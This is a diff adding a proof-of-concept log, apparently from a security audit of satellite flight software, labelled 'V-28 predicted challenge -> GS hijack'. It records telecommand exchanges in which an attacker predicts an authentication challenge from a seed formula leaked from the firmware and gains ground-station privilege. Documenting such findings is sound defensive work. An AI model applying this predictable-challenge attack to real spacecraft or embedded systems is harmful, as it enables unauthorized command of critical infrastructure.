@@ -1,0 +1,29 @@
+[   0.000] ========================================================================
+[   0.000] V-28 predicted challenge -> GS hijack
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x0E via=usb AES  payload=-
+[   0.001] <-- TM apid=0x0E AES len=30
+[   0.001] --> TC apid=0x11 via=radio AES  payload=01
+[   0.002] <-- TM apid=0x11 AES len=9
+[   0.002] --> advance(37000 ms)
+[   0.003] <-- TM apid=0x08 AES len=20
+[   0.003] <-- TM apid=0x01 AES len=8
+[   0.004] <-- TM apid=0x0E AES len=30
+[   0.004] <-- TM apid=0x08 AES len=20
+[   0.005] <-- TM apid=0x3FF AES len=14
+[   0.005] <-- TM apid=0x01 AES len=8
+[   0.005] attacker predicts challenge 0x302717AC for t=42000 ms (seed formula leaked from the image, no TRNG on RP2040 path)
+[   0.005] --> TC apid=0x12 via=radio AES  payload=00
+[   0.005] <-- TM apid=0x12 AES len=13
+[   0.005] actual challenge: 0x302717AC -> prediction exact: True
+[   0.005] --> TC apid=0x12 via=radio AES  payload=01f0f9ed62
+[   0.006] <-- TM apid=0x12 AES len=13
+[   0.006] --> TC apid=0x0A via=radio clear payload=00
+[   0.006] <-- TM apid=0x0A clear len=3
+[   0.006] --> TC apid=0x13 via=usb clear payload=-
+[   0.006] <-- TM apid=0x13 clear len=23
+[   0.006] GS_STATUS byte 0x2F: session+gate bits set for the attacker's session
+[   0.006] => no cryptographic binding of challenge to requester: full GS privilege from arithmetic + eavesdropped metadata
+[   0.006] ========================================================================
+[   0.006] POC OK
+[   0.006] ========================================================================
